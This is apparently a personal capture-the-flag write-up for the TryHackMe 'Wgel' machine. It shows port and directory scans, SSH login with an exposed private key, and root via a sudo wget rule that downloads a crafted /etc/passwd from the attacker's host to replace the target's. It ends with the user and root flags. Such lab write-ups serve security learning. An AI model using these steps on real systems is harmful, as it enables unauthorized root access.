# Box Name

## Wgel

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
 # nmap
 ```bash
 rustscan -a 10.10.201.227 --ulimit 5000 -- -sCV -oN nmap/intial
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.201.227:22
Open 10.10.201.227:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 # ferox
```bash
ferox -u http://10.10.201.227 -w ~/SecLists/Discovery/Web-Content/common.txt -t 30 -x txt,php,conf,cgi,js -C 403 -o logs/ferox.log

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.201.227
 🚀  Threads               │ 30
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.log
 💲  Extensions            │ [txt, php, conf, cgi, js]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200      378l      977w    11374c http://10.10.201.227/index.html
301        9l       28w      316c http://10.10.201.227/sitemap
301        9l       28w      320c http://10.10.201.227/sitemap/css
200      516l     1786w    21080c http://10.10.201.227/sitemap/index.html
301        9l       28w      319c http://10.10.201.227/sitemap/js
301        9l       28w      322c http://10.10.201.227/sitemap/fonts
200      276l      496w     5822c http://10.10.201.227/sitemap/js/main.js
301        9l       28w      321c http://10.10.201.227/sitemap/.ssh
301        9l       28w      323c http://10.10.201.227/sitemap/images
200       27l       33w     1675c http://10.10.201.227/sitemap/.ssh/id_rsa

```

 # found user name in source code of the default Apache index.html
 ![[Pasted image 20220705143258.png]]

 # also found id_rsa key in /sitemap/.ssh
 ![[Pasted image 20220705143430.png]]
 
## Initial Foothold
---
 ## used id_rsa file to ssh in as user jessie
 ```bash
 ssh -i files/id_rsa jessie@10.10.201.227
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ id;whoami
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
jessie
jessie@CorpOne:~$ 
```



---
## Privilege Escalation

# [[gtfobins]]  on wget
```bash
essie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~$ 

```

 ## downloaded /etc/passwd
 - changed roots password to blank
 - uploaded new /etc/passwd
 ```bash
 sudo -u root /usr/bin/wget http://10.13.13.55:9001/passwd -O /etc/passwd
--2022-07-05 23:07:15--  http://10.13.13.55:9001/passwd
Connecting to 10.13.13.55:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2305 (2,3K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd                                                100%[=======================================================================================================================================>]   2,25K  --.-KB/s    in 0s      

2022-07-05 23:07:15 (230 MB/s) - ‘/etc/passwd’ saved [2305/2305]

jessie@CorpOne:~$ su root 
Password: 
root@CorpOne:/home/jessie# 

```

 ## cat flags
 ```bash
root@CorpOne:~# cat /home/jessie/Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6

root@CorpOne:~# cat /root/root_flag.txt 
b1b968b37519ad1daa6408188649263d
root@CorpOne:~# 

```